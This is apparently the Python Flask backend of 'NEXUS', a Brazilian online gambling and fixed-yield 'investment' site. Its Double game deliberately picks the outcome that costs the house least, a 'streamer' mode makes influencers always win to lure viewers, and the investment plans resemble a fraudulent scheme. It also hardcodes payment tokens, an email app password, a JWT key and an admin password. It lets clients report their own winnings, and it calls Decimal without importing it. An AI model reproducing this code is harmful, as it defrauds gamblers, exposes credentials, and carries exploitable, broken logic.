import os
import datetime
import random
import string
import smtplib
import requests
import threading
from email.message import EmailMessage
from functools import wraps
from flask import Flask, request, jsonify
from flask_cors import CORS
from flask_sqlalchemy import SQLAlchemy
from werkzeug.security import generate_password_hash, check_password_hash
import jwt
import json
import mercadopago

# ==========================================
# CONFIGURAÇÃO CORE E SEGURANÇA
# ==========================================
app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}})

# Configuração do Banco de Dados (Ajuste robusto para Render/PostgreSQL)
db_url = os.environ.get("DATABASE_URL", "sqlite:///nexus_v3.db")
# Correção crítica para o Render (SQLAlchemy requer postgresql://)
if db_url and db_url.startswith("postgres://"):
    db_url = db_url.replace("postgres://", "postgresql://", 1)

app.config['SQLALCHEMY_DATABASE_URI'] = db_url
app.config['SQLALCHEMY_ENGINE_OPTIONS'] = {"pool_pre_ping": True} # Evita queda de conexão
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

# CHAVE SECRETA PARA CRIPTOGRAFIA DE TOKENS (Variável de ambiente no Render)
SECRET_KEY = os.environ.get("SECRET_KEY", "chave_super_secreta_ninja_nexus_2026")
app.config['SECRET_KEY'] = SECRET_KEY

db = SQLAlchemy(app)

# ==========================================
# CONFIGURAÇÃO MERCADO PAGO E E-MAIL
# ==========================================
MP_ACCESS_TOKEN = os.environ.get("MP_TOKEN",
                                 "APP_USR-5404172795263183-120500-011ecc797888559f820986bea6fd264b-511797801")
sdk = mercadopago.SDK(MP_ACCESS_TOKEN)

SMTP_USER = os.environ.get("SMTP_USER", "nexusinvestimento24@gmail.com")
SMTP_PASS = os.environ.get("SMTP_PASS", "pzvn fuuo cavm ljay")

# ==========================================
# ENVIO DE E-MAIL VIA API (FURA-BLOQUEIO DO RENDER)
# ==========================================
BREVO_API_KEY = os.environ.get("BREVO_API_KEY")


def enviar_email_recuperacao(destino, codigo):
    print(f">>> [THREAD] Iniciando envio via API Brevo para {destino}...", flush=True)

    url = "https://api.brevo.com/v3/smtp/email"

    payload = {
        "sender": {"name": "Suporte NEXUS", "email": "nexusinvestimento24@gmail.com"},
        "to": [{"email": destino}],
        "subject": "Código de Recuperação - NEXUS",
        "htmlContent": f"<h2>Olá!</h2><p>O seu código de recuperação de senha da plataforma NEXUS é: <strong><span style='font-size: 24px; color: #7000ff;'>{codigo}</span></strong></p><p>Este código expira em 15 minutos.</p>"
    }

    headers = {
        "accept": "application/json",
        "api-key": BREVO_API_KEY,
        "content-type": "application/json"
    }

    try:
        # Faz o envio usando a porta HTTPS (443) que o Render nunca bloqueia
        response = requests.post(url, json=payload, headers=headers, timeout=10)

        if response.status_code in [200, 201, 202]:
            print(f">>> [THREAD] E-mail enviado com sucesso via API para {destino}!", flush=True)
            return True
        else:
            print(f">>> [THREAD] Erro na API do Brevo: {response.text}", flush=True)
            return False
    except Exception as e:
        print(">>> [THREAD] Erro crítico ao chamar API do Brevo:", e, flush=True)
        return False


# ==========================================
# MODELOS DE BANCO DE DADOS
# ==========================================
class User(db.Model):
    __tablename__ = 'users'  # CORREÇÃO: Evita conflito com a palavra reservada 'user' no PostgreSQL

    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(50), unique=True, nullable=False)
    email = db.Column(db.String(120), unique=True, nullable=False)
    cpf = db.Column(db.String(20), unique=True, nullable=False)
    phone = db.Column(db.String(20), nullable=False)
    password_hash = db.Column(db.String(255), nullable=False)
    balance = db.Column(db.Float, default=0.0)
    role = db.Column(db.String(20), default='user')  # 'user' ou 'admin'
    vip = db.Column(db.String(20), default='iniciante')  # 'iniciante', 'streamer', 'adm'
    reset_code = db.Column(db.String(6), nullable=True)
    reset_code_exp = db.Column(db.DateTime, nullable=True)
    # NOVO: Sistema de Banimento
    status = db.Column(db.String(20), default='active')  # 'active' ou 'banned'
    ban_reason = db.Column(db.String(255), nullable=True)
    last_ip = db.Column(db.String(50), nullable=True)

class Transaction(db.Model):
    __tablename__ = 'transactions'

    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('users.id'), nullable=False)  # CORREÇÃO: Aponta para 'users.id'
    type = db.Column(db.String(20), nullable=False)  # 'deposit' ou 'withdraw'
    amount = db.Column(db.Float, nullable=False)
    status = db.Column(db.String(20), default='pending')  # 'pending', 'approved', 'rejected'
    pix_key = db.Column(db.String(100), nullable=True)
    external_id = db.Column(db.String(100), nullable=True)
    created_at = db.Column(db.DateTime, default=datetime.datetime.utcnow)
    
class Investment(db.Model):
    __tablename__ = 'investments'

    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('users.id'), nullable=False)
    plan_id = db.Column(db.Integer, nullable=False)
    name = db.Column(db.String(100), nullable=False)
    amount = db.Column(db.Float, nullable=False)
    yield_total = db.Column(db.Float, nullable=False)
    days = db.Column(db.Integer, nullable=False)
    start_time = db.Column(db.DateTime, default=datetime.datetime.utcnow)
    claimed = db.Column(db.Boolean, default=False)

class SystemConfig(db.Model):
    __tablename__ = 'system_config'
    key = db.Column(db.String(50), primary_key=True)
    value = db.Column(db.Text, nullable=False)

# ==========================================
# INICIALIZAÇÃO SEGURA DO BANCO DE DADOS
# ==========================================
# Função que garante a criação das tabelas no Render (mesmo com Gunicorn)
def setup_database():
    with app.app_context():
        try:
            db.create_all()
            # CRIAÇÃO DO ADMIN INICIAL CASO O BANCO SEJA ZERADO
            if not User.query.filter_by(username='admin').first():
                hashed = generate_password_hash('Nexus@Admin2026', method='pbkdf2:sha256')
                admin = User(
                    username='admin',
                    email='admin@nexus.com',
                    cpf='00000000000',
                    phone='000',
                    password_hash=hashed,
                    role='admin',
                    vip='adm'
                )
                db.session.add(admin)
                db.session.commit()
                print(">>> BANCO DE DADOS SINCRONIZADO E ADMIN CRIADO: admin / Nexus@Admin2026 <<<")
            else:
                print(">>> BANCO DE DADOS PRONTO (ADMIN JÁ EXISTE) <")
        except Exception as e:
            print(f">>> ERRO AO SINCRONIZAR BANCO DE DADOS: {e} <<<")


# Executa a configuração imediatamente na inicialização
setup_database()


# ==========================================
# DECORADORES DE SEGURANÇA (MIDDLEWARES)
# ==========================================
def token_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get('Authorization')
        if not token or not token.startswith("Bearer "):
            return jsonify({'success': False, 'msg': 'Sessão inválida'}), 401

        token = token.split(" ")[1]
        try:
            data = jwt.decode(token, app.config['SECRET_KEY'], algorithms=["HS256"])
            current_user = User.query.get(data['user_id'])

            if not current_user: raise Exception()

            # --- SISTEMA DE BLOQUEIO ENTRA AQUI ---
            if current_user.status == 'banned':
                return jsonify({'success': False, 'msg': f'CONTA CONGELADA. Motivo: {current_user.ban_reason}'}), 403

            # Registra o IP atual do usuário
            current_user.last_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
            db.session.commit()

        except Exception:
            return jsonify({'success': False, 'msg': 'Sessão expirada. Refaça o login.'}), 401

        return f(current_user, *args, **kwargs)

    return decorated


def admin_required(f):
    @wraps(f)
    @token_required
    def decorated(current_user, *args, **kwargs):
        if current_user.role != 'admin' and current_user.vip != 'adm':
            return jsonify({'success': False, 'msg': 'Acesso negado. GOD MODE.'}), 403
        return f(current_user, *args, **kwargs)

    return decorated


# ==========================================
# ROTAS DE AUTENTICAÇÃO E PERFIL
# ==========================================
@app.route('/api/user/me', methods=['GET'])
@token_required
def get_me(current_user):
    return jsonify({
        'success': True,
        'user': {
            'id': current_user.id, 'username': current_user.username,
            'balance': current_user.balance, 'role': current_user.role,
            'vip': current_user.vip, 'email': current_user.email
        }
    })


@app.route('/api/auth/register', methods=['POST'])
def register():
    data = request.json
    if User.query.filter(
            (User.username == data['username']) | (User.email == data['email']) | (User.cpf == data['cpf'])).first():
        return jsonify({'success': False, 'msg': 'Usuário, Email ou CPF já cadastrados.'})

    hashed_password = generate_password_hash(data['password'], method='pbkdf2:sha256')
    new_user = User(
        username=data['username'], email=data['email'], cpf=data['cpf'],
        phone=data['phone'], password_hash=hashed_password,
        role='user', vip='iniciante'
    )
    db.session.add(new_user)
    db.session.commit()
    return jsonify({'success': True, 'msg': 'Conta criada com sucesso!'})


@app.route('/api/auth/login', methods=['POST'])
def login():
    data = request.json
    user = User.query.filter((User.username == data['login']) | (User.email == data['login'])).first()

    if user and check_password_hash(user.password_hash, data['password']):
        token = jwt.encode({'user_id': user.id, 'exp': datetime.datetime.utcnow() + datetime.timedelta(hours=24)},
                           app.config['SECRET_KEY'], algorithm="HS256")
        return jsonify({
            'success': True, 'token': token,
            'user': {'id': user.id, 'username': user.username, 'balance': user.balance, 'role': user.role,
                     'vip': user.vip}
        })
    return jsonify({'success': False, 'msg': 'Credenciais incorretas.'})


@app.route('/api/auth/forgot_password', methods=['POST'])
def forgot_password():
    data = request.json
    email_digitado = data.get('email')

    print(f">>> [API] Alguém pediu recuperação para o email: {email_digitado}", flush=True)

    user = User.query.filter_by(email=email_digitado).first()

    if user:
        print(">>> [API] Usuário EXISTE no banco! Gerando código e chamando a Thread...", flush=True)
        code = ''.join(random.choices(string.digits, k=6))
        user.reset_code = code
        user.reset_code_exp = datetime.datetime.utcnow() + datetime.timedelta(minutes=15)
        db.session.commit()

        thread_email = threading.Thread(target=enviar_email_recuperacao, args=(user.email, code))
        thread_email.start()
    else:
        print(">>> [API] Usuário NÃO ENCONTRADO no banco. Ignorando o e-mail silenciosamente.", flush=True)

    return jsonify({'success': True, 'msg': 'Código enviado!'})


@app.route('/api/auth/reset_password', methods=['POST'])
def reset_password():
    data = request.json
    user = User.query.filter_by(reset_code=data.get('code')).first()
    if not user or not user.reset_code_exp or user.reset_code_exp < datetime.datetime.utcnow():
        return jsonify({'success': False, 'msg': 'Código inválido ou expirado.'})

    user.password_hash = generate_password_hash(data.get('new_password'), method='pbkdf2:sha256')
    user.reset_code = None
    user.reset_code_exp = None
    db.session.commit()
    return jsonify({'success': True, 'msg': 'Senha alterada com sucesso!'})


# ==========================================
# FINANCEIRO (DEPÓSITO / SAQUE)
# ==========================================
@app.route('/api/deposit/pix', methods=['POST'])
@token_required
def generate_pix(current_user):
    amount = float(request.json.get('amount', 0))
    if amount < 20: return jsonify({'success': False, 'msg': 'Mínimo de depósito é R$ 20.00'})

    try:
        payment_data = {
            "transaction_amount": amount,
            "description": f"Deposito NEXUS - {current_user.username}",
            "payment_method_id": "pix",
            "payer": {"email": current_user.email, "first_name": current_user.username}
        }
        payment = sdk.payment().create(payment_data)["response"]

        if "id" in payment:
            db.session.add(
                Transaction(user_id=current_user.id, type='deposit', amount=amount, external_id=str(payment["id"])))
            db.session.commit()
            return jsonify({
                'success': True,
                'qr_code_base64': payment['point_of_interaction']['transaction_data']['qr_code_base64'],
                'qr_code': payment['point_of_interaction']['transaction_data']['qr_code']
            })
    except Exception as e:
        print("Erro MercadoPago:", e)

    return jsonify({'success': False, 'msg': 'Erro ao comunicar com o Banco.'})


@app.route('/api/withdraw/request', methods=['POST'])
@token_required
def withdraw_request(current_user):
    amount = float(request.json.get('amount', 0))
    if amount <= 0 or current_user.balance < amount:
        return jsonify({'success': False, 'msg': 'Saldo insuficiente ou valor inválido.'})

    # --- LÓGICA DA TAXA DE SAQUE DE 5% ---
    taxa_retida = amount * 0.05
    valor_liquido = amount - taxa_retida

    # Desconta o valor total da banca do usuário
    current_user.balance -= amount

    # Mas registra apenas o valor líquido para você pagar no PIX
    db.session.add(
        Transaction(user_id=current_user.id, type='withdraw', amount=valor_liquido, pix_key=request.json.get('pix_key'),
                    status='pending'))
    db.session.commit()

    return jsonify({
        'success': True,
        'msg': f'Saque solicitado! Valor líquido: R$ {valor_liquido:.2f} (-5% de taxa).',
        'new_balance': current_user.balance
    })
# ==========================================
# ROTAS GENÉRICAS DE JOGOS (MINES, AVIATOR, INDEX)
# ==========================================
@app.route('/api/game/bet', methods=['POST'])
@token_required
def game_bet(current_user):
    amount = float(request.json.get('amount', 0))
    if amount <= 0 or current_user.balance < amount:
        return jsonify({'success': False, 'msg': 'Saldo insuficiente'})

    current_user.balance -= amount
    db.session.commit()
    return jsonify({'success': True, 'new_balance': current_user.balance})


@app.route('/api/game/win', methods=['POST'])
@token_required
def game_win(current_user):
    try:
        win_amount = Decimal(str(request.json.get('win_amount', 0)))
    except:
        return jsonify({'success': False, 'msg': 'Valor inválido'})

    # --- ARMADILHA DO SISTEMA DE FRAUDE ---
    if win_amount < 0 or win_amount > Decimal('50000'):
        # Congela a conta na hora!
        current_user.status = 'banned'
        current_user.ban_reason = f'Tentativa de injeção de saldo anormal ({win_amount}) no IP {current_user.last_ip}'
        db.session.commit()
        print(f"🚨 ALERTA DE FRAUDE: Usuário {current_user.username} banido automaticamente!")

        return jsonify(
            {'success': False, 'msg': 'Atividade suspeita detectada. Sua conta foi bloqueada para auditoria.'}), 403

    # Se passar pela armadilha, segue o fluxo normal com trava (Row Lock)
    user_db = db.session.query(User).filter_by(id=current_user.id).with_for_update().first()
    user_db.balance += win_amount
    db.session.commit()

    return jsonify({'success': True, 'new_balance': float(user_db.balance)})


# ==========================================
# ALGORITMO DOUBLE (MAXIMIZAÇÃO DE LUCRO GLOBAL)
# ==========================================
@app.route('/api/game/double/spin', methods=['POST'])
@token_required
def double_spin(current_user):
    data = request.json
    bet_color = data.get('color')

    try:
        bet_amount = float(data.get('amount', 0)) if data.get('amount') else 0
    except:
        return jsonify({'success': False, 'msg': 'Valor inválido.'})

    # Totais da mesa enviados pelo frontend (incluindo bots e o jogador)
    total_red = float(data.get('total_red', 0))
    total_black = float(data.get('total_black', 0))
    total_white = float(data.get('total_white', 0))

    if bet_amount > 0 and bet_amount > current_user.balance:
        return jsonify({'success': False, 'msg': 'Saldo insuficiente.'})

    # 1. A Casa pega o dinheiro da aposta real
    if bet_amount > 0:
        current_user.balance -= bet_amount

    # MODO STREAMER: Ignora o algoritmo, sempre força o influencer a ganhar
    if current_user.vip == 'streamer' and bet_color:
        result_color = bet_color
        win_amount = bet_amount * (14 if bet_color == 'white' else 2)
        current_user.balance += win_amount
        db.session.commit()
        return jsonify({
            'success': True,
            'result_color': result_color,
            'win_amount': win_amount,
            'new_balance': current_user.balance
        })

    # --- LÓGICA DE MAXIMIZAÇÃO DE LUCRO DA CASA ---

    # Calcula quanto a casa teria que pagar para todos os players em cada cenário
    payout_red = (bet_amount * 2) if bet_color == 'red' else 0
    payout_black = (bet_amount * 2) if bet_color == 'black' else 0
    payout_white = (bet_amount * 14) if bet_color == 'white' else 0

    options = [
        {'color': 'red', 'loss': payout_red},
        {'color': 'black', 'loss': payout_black},
        {'color': 'white', 'loss': payout_white}
    ]

    options.sort(key=lambda x: x['loss'])

    best_loss = options[0]['loss']
    best_outcomes = [opt['color'] for opt in options if opt['loss'] == best_loss]
    result_color = random.choice(best_outcomes)

    # --- FIM DA LÓGICA PREDATÓRIA ---

    # Verifica se o jogador real deu a sorte de cair na mesma cor que a casa escolheu
    win_amount = 0
    if bet_color and result_color == bet_color:
        multiplier = 14 if result_color == 'white' else 2
        win_amount = bet_amount * multiplier
        current_user.balance += win_amount

    db.session.commit()

    return jsonify({
        'success': True,
        'result_color': result_color,
        'win_amount': win_amount,
        'new_balance': current_user.balance
    })


# ==========================================
# ROTAS DE INVESTIMENTO (NUVEM)
# ==========================================
@app.route('/api/investment/buy', methods=['POST'])
@token_required
def buy_investment(current_user):
    data = request.json
    amount = float(data.get('amount', 0))
    plan_id = data.get('plan_id')
    name = data.get('name')
    yield_total = float(data.get('yieldTotal', 0))
    days = int(data.get('days', 0))

    if amount <= 0 or current_user.balance < amount:
        return jsonify({'success': False, 'msg': 'Saldo insuficiente.'})

    # Desconta do saldo
    current_user.balance -= amount

    # Salva no banco de dados
    new_inv = Investment(
        user_id=current_user.id, plan_id=plan_id, name=name,
        amount=amount, yield_total=yield_total, days=days
    )
    db.session.add(new_inv)
    db.session.commit()

    return jsonify({'success': True, 'msg': 'Plano ativado!', 'new_balance': current_user.balance})


@app.route('/api/investment/active', methods=['GET'])
@token_required
def get_active_investments(current_user):
    investments = Investment.query.filter_by(user_id=current_user.id, claimed=False).all()
    inv_list = []
    for inv in investments:
        inv_list.append({
            'id': inv.id, 'plan_id': inv.plan_id, 'name': inv.name,
            'amount': inv.amount, 'yieldTotal': inv.yield_total, 'days': inv.days,
            'startTime': int(inv.start_time.timestamp() * 1000)  # Formato JS
        })
    return jsonify({'success': True, 'investments': inv_list})


@app.route('/api/investment/claim', methods=['POST'])
@token_required
def claim_investment(current_user):
    inv_id = request.json.get('inv_id')
    inv = Investment.query.filter_by(id=inv_id, user_id=current_user.id, claimed=False).first()

    if not inv:
        return jsonify({'success': False, 'msg': 'Investimento não encontrado ou já resgatado.'})

    # Valida no servidor se o tempo realmente passou!
    end_time = inv.start_time + datetime.timedelta(days=inv.days)
    if datetime.datetime.utcnow() < end_time:
        return jsonify({'success': False, 'msg': 'O plano ainda não terminou de render.'})

    # Calcula e paga
    lucro = inv.amount * (inv.yield_total / 100)
    total_a_pagar = inv.amount + lucro

    inv.claimed = True
    current_user.balance += total_a_pagar
    db.session.commit()

    return jsonify({'success': True, 'new_balance': current_user.balance, 'payout': total_a_pagar})

# ==========================================
# TERMINAL DE COMANDO - PAINEL ADMIN NINJA
# ==========================================
@app.route('/api/admin/dashboard', methods=['GET'])
@admin_required
def admin_dashboard(current_user):
    users = [{"id": u.id, "username": u.username, "email": u.email, "cpf": u.cpf, "balance": u.balance, "vip": u.vip}
             for u in User.query.all()]

    # Tratamento caso o usuário que solicitou o saque já tenha sido deletado
    wd_data = []
    for w in Transaction.query.filter_by(type='withdraw', status='pending').all():
        u_obj = User.query.get(w.user_id)
        uname = u_obj.username if u_obj else 'Deletado'
        wd_data.append({"id": w.id, "user": uname, "amount": w.amount, "pix": w.pix_key})

    return jsonify({'success': True, 'users': users, 'withdrawals': wd_data})


@app.route('/api/admin/withdraw/action', methods=['POST'])
@admin_required
def admin_withdraw_action(current_user):
    data = request.json
    trans = Transaction.query.get(data.get('id'))
    if not trans or trans.status != 'pending':
        return jsonify({'success': False, 'msg': 'Erro ou saque já processado.'})

    if data.get('action') == 'approve':
        trans.status = 'approved'
    else:
        trans.status = 'rejected'
        target_user = User.query.get(trans.user_id)
        if target_user:
            target_user.balance += trans.amount  # Estorna o valor

    db.session.commit()
    return jsonify({'success': True, 'msg': 'Ação executada com sucesso.'})


@app.route('/api/admin/user/update', methods=['POST'])
@admin_required
def admin_user_update(current_user):
    data = request.json
    target_user = User.query.get(data.get('id'))
    if not target_user:
        return jsonify({'success': False, 'msg': 'Usuário não encontrado.'})

    if 'balance_add' in data:
        target_user.balance += float(data['balance_add'])
    if 'vip' in data:
        target_user.vip = data['vip']
        target_user.role = 'admin' if data['vip'] == 'adm' else 'user'

    db.session.commit()
    return jsonify({'success': True, 'new_balance': target_user.balance})


@app.route('/api/admin/user/delete', methods=['POST'])
@admin_required
def admin_user_delete(current_user):
    target_user = User.query.get(request.json.get('id'))
    if target_user:
        # CORREÇÃO: Remove transações antes de deletar o usuário para evitar erros do Banco
        Transaction.query.filter_by(user_id=target_user.id).delete()
        db.session.delete(target_user)
        db.session.commit()
    return jsonify({'success': True})


@app.route('/api/config', methods=['GET'])
def get_config():
    configs = SystemConfig.query.all()
    # Converte os valores de volta de JSON para objeto/texto
    data = {}
    for c in configs:
        try:
            data[c.key] = json.loads(c.value)
        except:
            data[c.key] = c.value
    return jsonify({'success': True, 'config': data})


# Rota protegida pro Admin salvar as configurações
@app.route('/api/admin/config', methods=['POST'])
@admin_required
def save_config(current_user):
    data = request.json
    for key, value in data.items():
        # Converte para string JSON se for lista/dicionário (ex: planos de investimento)
        val_str = json.dumps(value) if isinstance(value, (list, dict)) else str(value)

        conf = SystemConfig.query.get(key)
        if conf:
            conf.value = val_str
        else:
            new_conf = SystemConfig(key=key, value=val_str)
            db.session.add(new_conf)

    db.session.commit()
    return jsonify({'success': True, 'msg': 'Configurações globais salvas no Render!'})


# ==========================================
# INICIALIZAÇÃO DA APLICAÇÃO
# ==========================================
if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False)

